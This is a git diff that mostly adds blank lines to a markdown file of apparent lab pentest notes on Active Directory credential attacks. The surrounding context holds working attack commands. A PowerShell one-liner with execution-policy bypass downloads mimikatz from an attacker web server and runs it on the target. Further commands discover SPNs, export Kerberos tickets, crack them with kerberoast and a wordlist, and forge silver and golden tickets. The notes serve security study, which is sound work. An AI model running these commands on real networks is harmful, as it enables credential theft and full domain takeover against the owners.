@@ -9,13 +9,16 @@
 
 # 1. Cached Credential Storage and Retrieval
 **On Kali**: Setup web server to host `mimikatz`
+
 ```console
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
 sudo python3 -m http.server 80 &> /dev/null &
 ```
+
 **On Target**: Download and run `mimikatz`
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Start-Process`
+
 ```console
 powershell.exe -nop -Exec Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
 ```
@@ -402,6 +405,7 @@ SVR
 - Ref: <https://github.com/nidem/kerberoast>
 
 ### 3.1.1. Discover SPNs
+
 ```console
 C:\Users\mike>setspn -Q */*
 Checking domain DC=lab,DC=vx
@@ -452,6 +456,7 @@ Existing SPN found!
 ```
 
 ### 3.1.2. Request tickets
+
 ```console
 PS C:\Users\mike> klist
 
@@ -658,6 +663,7 @@ mimikatz # kerberos::list /export
 
 ### 3.1.3. Crack KRB_TGS to retrieve service account password (brute force)
 - Setup `kerberoast` on Kali Linux
+
 ```console
 ┌──(kali㉿kali)-[~]
 └─$ sudo apt update
@@ -694,6 +700,7 @@ Processing triggers for kali-menu (2021.4.2) ...
 ```
 
 - Upload the dumped KRB_TGS and run the kerberoast brute force script
+
 ```console
 ┌──(kali㉿kali)-[~]
 └─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -705,6 +712,7 @@ Successfully cracked all tickets
 ```
 
 ## 3.2. Silver Ticket
+
 ```console
 kerberos::purge
 kerberos::list
@@ -713,6 +721,7 @@ kerberos::list
 ```
 
 # 5. Golden Ticket
+
 ```console
 lsadump::lsa /patch
 kerberos::purge
